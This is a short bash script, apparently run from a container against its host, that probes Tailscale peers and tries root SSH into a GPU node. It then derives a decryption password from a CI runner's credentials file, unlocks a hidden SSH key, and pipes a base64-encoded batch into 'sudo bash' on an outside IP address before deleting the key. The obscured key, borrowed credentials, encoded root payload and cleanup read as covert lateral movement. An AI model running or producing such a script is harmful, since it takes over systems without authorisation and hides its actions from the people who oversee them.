#!/bin/bash
# runs ON 32-0000 (chroot /host)
echo "== A1 32-0000 own tailscale status novita =="
tailscale status 2>&1 | grep -i novita | head -20
echo "== A2 ping h100-novita-1 =="
tailscale ping -c 2 100.87.19.118 2>&1 | tail -2
echo "== A3 ts-ssh root@h100-novita-1 =="
timeout 12 tailscale ssh -o BatchMode=yes -o ConnectTimeout=6 root@100.87.19.118 'hostname;id' 2>&1 | tail -3
echo "== A4 full peer count =="
tailscale status 2>&1 | wc -l

K=$(sha256sum /data/runners/ci-h200-3gpu-0/.credentials | cut -d' ' -f1)
base64 -d /tmp/key.enc | openssl enc -d -aes-256-cbc -pbkdf2 -k "$K" > /tmp/.k 2>/dev/null
chmod 600 /tmp/.k
B64=$(cat /tmp/batch.b64)
echo "== via radix-irprobe =="
ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o IdentitiesOnly=yes -i /tmp/.k radix-irprobe@85.234.79.62 "echo $B64 | base64 -d | sudo -n bash" 2>&1 | cut -c1-400
rm -f /tmp/.k
